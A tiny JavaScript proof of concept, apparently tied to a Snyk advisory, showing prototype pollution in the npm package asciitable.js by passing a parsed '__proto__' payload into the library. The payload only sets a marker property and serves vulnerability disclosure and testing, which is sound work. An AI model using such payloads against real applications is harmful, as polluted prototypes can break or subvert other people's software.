//https://snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799
 
   

  const req = require("asciitable.js");
  const b = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  req({}, b);
// End of file
